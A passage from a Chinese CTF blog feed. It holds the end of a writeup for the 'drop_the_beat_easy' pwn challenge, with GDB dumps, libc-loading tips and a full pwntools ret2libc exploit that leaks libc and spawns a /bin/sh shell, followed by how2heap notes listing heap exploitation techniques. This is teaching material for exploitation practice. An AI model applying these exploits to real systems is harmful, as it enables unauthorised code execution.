class="number">0xffffffff</span></span><br><span class="line">$edx   : <span class="number">0xf7ed9870</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esp   : <span class="number">0xffd211ac</span>  →  <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span></span><br><span class="line">$ebp   : <span class="number">0x41414141</span> (<span class="string">"AAAA"</span>?)</span><br><span class="line">$esi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$edi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$eip   : <span class="number">0x08048673</span>  →  &lt;main+<span class="number">312</span>&gt; ret </span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: <span class="number">0x0023</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x002b</span> $es: <span class="number">0x002b</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0063</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line"><span class="number">0xffd211ac</span>│+<span class="number">0x0000</span>: <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span> ← $esp</span><br><span class="line"><span class="number">0xffd211b0</span>│+<span class="number">0x0004</span>: <span class="number">0x0804a018</span>  →  <span class="number">0xf7d3e540</span>  →  &lt;__libc_start_main+<span class="number">0</span>&gt; call <span class="number">0xf7e45b59</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"><span class="number">0xffd211b4</span>│+<span class="number">0x0008</span>: <span class="number">0x0804853b</span>  →  &lt;main+<span class="number">0</span>&gt; push ebp</span><br><span class="line"><span class="number">0xffd211b8</span>│+<span class="number">0x000c</span>: <span class="number">0xffd2124c</span>  →  <span class="number">0xffd2330d</span>  →  <span class="string">"QT_QPA_PLATFORMTHEME=appmenu-qt5"</span></span><br><span class="line"><span class="number">0xffd211bc</span>│+<span class="number">0x0010</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c0</span>│+<span class="number">0x0014</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c4</span>│+<span class="number">0x0018</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c8</span>│+<span class="number">0x001c</span>: <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">32</span> ────</span><br><span class="line">    <span class="number">0x8048667</span> &lt;main+<span class="number">300</span>&gt;       inc    DWORD PTR [ebx+<span class="number">0x16a04c4</span>]</span><br><span class="line">    <span class="number">0x804866d</span> &lt;main+<span class="number">306</span>&gt;       call   <span class="number">0x80483f0</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">    <span class="number">0x8048672</span> &lt;main+<span class="number">311</span>&gt;       leave  </span><br><span class="line"> →  <span class="number">0x8048673</span> &lt;main+<span class="number">312</span>&gt;       ret    </span><br><span class="line">   ↳   <span class="number">0x80483e0</span> &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt;     jmp    DWORD PTR ds:<span class="number">0x804a010</span></span><br></pre></td></tr></table></figure><p>可以发现函数的返回地址是错误的，然后我们运行一遍正确的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0       </span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0xffffffff</span><br><span class="line">$edx   : 0xf7f9a870  →  0x00000000</span><br><span class="line">$esp   : 0xffddb3fc  →  0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010</span><br><span class="line">$ebp   : 0x41414141 (&quot;AAAA&quot;?)</span><br><span class="line">$esi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048673  →  &lt;main+312&gt; ret </span><br><span class="line">$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffddb3fc│+0x0000: 0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010 ← $esp</span><br><span class="line">0xffddb400│+0x0004: 0x0804853b  →  &lt;main+0&gt; push ebp</span><br><span class="line">0xffddb404│+0x0008: 0x0804a018  →  0xf7dff540  →  &lt;__libc_start_main+0&gt; call 0xf7f06b59 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">0xffddb408│+0x000c: 0xffddb49c  →  0xffddd30d  →  &quot;QT_QPA_PLATFORMTHEME=appmenu-qt5&quot;</span><br><span class="line">0xffddb40c│+0x0010: 0x00000000</span><br><span class="line">0xffddb410│+0x0014: 0x00000000</span><br><span class="line">0xffddb414│+0x0018: 0x00000000</span><br><span class="line">0xffddb418│+0x001c: 0xf7f99000  →  0x001b1db0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048667 &lt;main+300&gt;       inc    DWORD PTR [ebx+0x16a04c4]</span><br><span class="line">    0x804866d &lt;main+306&gt;       call   0x80483f0 &lt;exit@plt&gt;</span><br><span class="line">    0x8048672 &lt;main+311&gt;       leave  </span><br><span class="line"> →  0x8048673 &lt;main+312&gt;       ret    </span><br><span class="line">   ↳   0x80483e0 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x804a010</span><br><span class="line">       0x80483e6 &lt;puts@plt+6&gt;     push   0x8</span><br><span class="line">       0x80483eb &lt;puts@plt+11&gt;    jmp    0x80483c0</span><br><span class="line">       0x80483f0 &lt;exit@plt+0&gt;     jmp    DWORD PTR ds:0x804a014</span><br><span class="line">       0x80483f6 &lt;exit@plt+6&gt;     push   0x10</span><br><span class="line">       0x80483fb &lt;exit@plt+11&gt;    jmp    0x80483c0</span><br></pre></td></tr></table></figure><p>可以发现返回地址正确了</p><p>总之第一点就是下断点可以下在<code>leave</code>处</p><p>还有就是在程序为完全静态编译没有调用动态库的时候也是可以知道一些相关的编译信息的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ./binary_name | grep GCC</span><br><span class="line">确定Ubuntu多少版本和gcc版本</span><br></pre></td></tr></table></figure><p>例如这题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$  strings ./drop_the_beat_easy | grep GCC</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br></pre></td></tr></table></figure><p>还有一个命令是可以查看当前程序的动态加载库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ ldd ./drop_the_beat_easy</span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7f18000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d41000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f1a000)</span><br></pre></td></tr></table></figure><p>然后在题目给了libc的情况下，我们的程序如果没有经过修改就运行的话，调用的是我们本机的libc库，所以我们需要修改他的动态加载库</p><p>在写exp的时候可以这样写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(&quot;./drop_the_beat_easy&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br></pre></td></tr></table></figure><p>后面的env就是动态加载库的文件</p><p>我们还可以通过安装 patchelf 来直接重定位软件的动态加载库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf  --set-interpreter /mnt/hgfs/shared/multi_version_ld/ld-2.23_x86-64.so.2 ./babystack</span><br></pre></td></tr></table></figure><p>patchelf 的更多命令还是通过help进行查看</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ patchelf --help</span><br><span class="line">syntax: patchelf</span><br><span class="line">  [--<span class="built_in">set</span>-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]Prints 'DT_SONAME' entry of .dynamic section. Raises an error if DT_SONAME doesn't exist</span><br><span class="line">  [--set-soname SONAME]Sets 'DT_SONAME' entry to SONAME.</span><br><span class="line">  [--<span class="built_in">set</span>-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line">  [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  [--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-<span class="keyword">default</span>-lib]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME</span><br></pre></td></tr></table></figure><p>还有就是接受的问题，有时候接受可能会多一个或者少一个换行符，可以先用recv一次全部查看一下接受的内容</p><p>最后最终的EXP就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main)</span><br><span class="line"><span class="keyword">print</span> hex(puts_plt)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">"system"</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(libc.symbols[<span class="string">"system"</span>])*<span class="number">2</span>+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有就是可以在 <code>/usr/include/asm/unistd_32.h</code>直接查看32位系统的系统调用号，配合<code>grep</code>效果更好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ cat /usr/include/<span class="keyword">asm</span>/unistd_64.h | grep execve</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execveat 322</span></span><br></pre></td></tr></table></figure><p>还有就是熟练使用ROPgadget生成ROP chain</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap笔记0x01</title>
      <link href="/2019/10/30/how2heap%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F0x01/"/>
      <url>/2019/10/30/how2heap%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F0x01/</url>
      
        <content type="html"><![CDATA[<p><strong>how2heap</strong>是<strong>shellphish</strong>团队在<strong>Github</strong>上开源的堆漏洞系列教程，地址链接:<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a></p><table><thead><tr><th>File</th><th>Technique</th><th>Glibc-Version</th><th>Applicable CTF Challenges</th></tr></thead><tbody><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c" target="_blank" rel="noopener">first_fit.c</a></td><td>Demonstrating glibc malloc’s first-fit behavior.</td><td></td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">fastbin_dup.c</a></td><td>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.</td><td></td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin_dup_into_stack.c</a></td><td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist.</td><td>latest</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">9447-search-engine</a>, <a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="noopener">0ctf 2017-babyheap</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">fastbin_dup_consolidate.c</a></td><td>Tricking malloc into returning an already-allocated heap pointer by  putting a pointer on both fastbin freelist and unsorted bin freelist.</td><td>latest</td><td><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder" target="_blank" rel="noopener">Hitcon 2016 SleepyHolder</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="noopener">unsafe_unlink.c</a></td><td>Exploiting free on a corrupted chunk to get arbitrary write.</td><td>&lt; 2.26</td><td><a href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/" target="_blank" rel="noopener">HITCON CTF 2014-stkof</a>, <a href="https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a" target="_blank" rel="noopener">Insomni’hack 2017-Wheel of Robots</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c" target="_blank" rel="noopener">house_of_spirit.c</a></td><td>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</td><td>latest</td><td><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="noopener">hack.lu CTF 2014-OREO</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/poison_null_byte.c" target="_blank" rel="noopener">poison_null_byte.c</a></td><td>Exploiting a single null byte overflow.</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb" target="_blank" rel="noopener">PlaidCTF 2015-plaiddb</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c" target="_blank" rel="noopener">house_of_lore.c</a></td><td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</td><td>&lt; 2.26</td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c" target="_blank" rel="noopener">overlapping_chunks.c</a></td><td>Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore" target="_blank" rel="noopener">hack.lu CTF 2015-bookstore</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400" target="_blank" rel="noopener">Nuit du Hack 2016-night-deamonic-heap</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/overlapping_chunks_2.c" target="_blank" rel="noopener">overlapping_chunks_2.c</a></td><td>Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk</td><td>latest</td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c" target="_blank" rel="noopener">house_of_force.c</a></td><td>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</td><td>&lt; 2.29</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6" target="_blank" rel="noopener">Boston Key Party 2016-cookbook</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="noopener">BCTF 2016-bcloud</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_into_stack.c" target="_blank" rel="noopener">unsorted_bin_into_stack.c</a></td><td>Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer.</td><td>&lt; 2.26</td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">unsorted_bin_attack.c</a></td><td>Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address</td><td>&lt; 2.28</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6" target="_blank" rel="noopener">0ctf 2016-zerostorage</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c" target="_blank" rel="noopener">large_bin_attack.c</a></td><td>Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address</td><td>&lt; 2.26</td><td><a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/" target="_blank" rel="noopener">0ctf 2018-heapstorm2</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c" target="_blank" rel="noopener">house_of_einherjar.c</a></td><td>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</td><td>&lt; 2.26</td><td><a href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf" target="_blank" rel="noopener">Seccon 2016-tinypad</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c" target="_blank" rel="noopener">house_of_orange.c</a></td><td>Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500" target="_blank" rel="noopener">Hitcon 2016 houseoforange</a></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c" target="_blank" rel="noopener">tcache_dup.c</a></td><td>Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist.</td><td>2.26 - 2.28</td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">tcache_poisoning.c</a></td><td>Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist.</td><td>&gt; 2.25</td><td></td></tr><tr><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">tcache_house_of_spirit.c</a></td><td>Frees a fake chunk to get malloc to return a nearly-arbitrary pointer.</td><td>&gt; 2.25</td><td></td></tr></tbody></table><h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first_fit"></a>0x01 <strong>first_fit</strong></h1><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="comment">//这个程序并不展示如何攻击,而是展示glibc的一种分配规则.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="comment">//glibc使用一种first-fit算法去选择一个free-chunk.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="comment">//如果存在一个free-chunk并且足够大的话,malloc会优先选取这个chunk.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"><span class="comment">//这种机制就可以在被利用于use after free的情形中.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="comment">//先分配两个buffer,可以分配大一点,是不是fastbin也无所谓.</span></span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="comment">//我们也可以继续分配…</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="comment">//为了方便展示如何利用这个机制,我们在这里放置一个字符串 “this is A!”</span></span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//我们使第一个分配的内存空间的地址指向这个字符串”this is A!”.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="comment">//然后free掉这块内存…</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"><span class="comment">//我们也不需要free其他内存块了.之后只要我们用malloc申请的内存大小小于第一块的512字节,都会给我们返回第一个内存块开始的地址</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    <span class="comment">//ok,我们现在开始用malloc申请500个字节试试.</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="comment">//然后我们在这个地方放置一个不同的字符串 “this is C!”</span></span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="comment">//第三个返回的内存块的地址 0x662420 指向了这个字符串 “this is C!”.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//第一个返回的内存块的地址也指向这个字符串!</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 